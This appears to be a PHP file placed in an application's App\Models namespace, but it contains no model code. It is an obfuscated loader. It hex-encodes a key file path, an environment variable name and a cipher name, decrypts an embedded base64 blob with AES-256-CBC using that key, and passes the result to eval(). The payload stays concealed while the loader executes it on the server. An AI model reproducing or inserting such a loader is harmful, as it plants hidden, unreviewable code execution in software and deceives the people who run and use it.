<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('JjI/dOzHfRREZs+kC96qYA==');

$c=base64_decode(

'sswPbjB+v7uYYTPtLCTzWxpb/TsmgRpsf1YWz2ZvbUPfFHujbsblB5H881R6swTgOrPJh6ZSC1ep' .
'RHw2kIw7Uq+rlBRzrlVA0Rb9uPT6le6aHh+7yfvCC2hpzZmdyAqMky9+oyP9KzpcUhmIcy1/xiQy' .
'97IJNAlV+hsVcBZnEjNbmevEgQX5oB3dAXwxBlIlHUlA0gmb5eR9qnA9tilru/whPT4y2IA3Pe8H' .
'Uy6PpW2fX9WcKiUCyhkS75JttAP8S84VmEYPczghloYfd7CXP7rabvOOpjfg/awjQtzEKjlhAyOH' .
'/pfITAQNmONiHzkP94MpzsJYuIW7uVyLFSQRoD/yDXu1TCftKg4dQ3/ZvCYcrYxduz/Kc+5D68CZ' .
'uI2xziAQ+agBuXJldaLLPIK3BU+JfD1ndlBFgJgcTWizGrf76RjfHmdYP/cAfSaOeiyecvRbJIzr' .
'Vkde+gWErmDrzYefageqDE34e47T90BB5XAY2NQhvpdM5SKCEDYPRXoROlvLNRMuza6oAfSk9HX9' .
'0Mrem1mIlcEMizoPay/RV0KEoA2NRlKOaKDKQDR6YpW3ItJXCAR71PMh+u93O0sfEpPIgEAzcBY3' .
'7T/DssSJcg63eg5Oa/o/kgrp8aFCG71cNQzKGVnGxUjpkQil5KXOWsRrV557q4SEO2NhTarcwAgE' .
'75DQbP74MoVOHSXWkj/QUyqlZX560DYSAxUlt+4auSfgUtI2ZhrY2vKYR3+omSna26MexsWYdctj' .
'cKDJxMBft2dHob+s7huQnUyi4cLVXarT1o9IwLQWgy8297OyR+dyVkB0Wiokx8S2mivKjxnBT0cG' .
'zCZaxmcz9LGvmLCylLShAwA2F2aefMo7CDboE5cLJfR8IvkpQQPCdDIWGmP4vcDPAwyrw7OPguf0' .
'+0ZYQaPxUw8rAmLhS3w0JE3jd5buVzPXlZlACTcp2+xjgY6ucaABx/IIEIK9egC4zV9qGg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

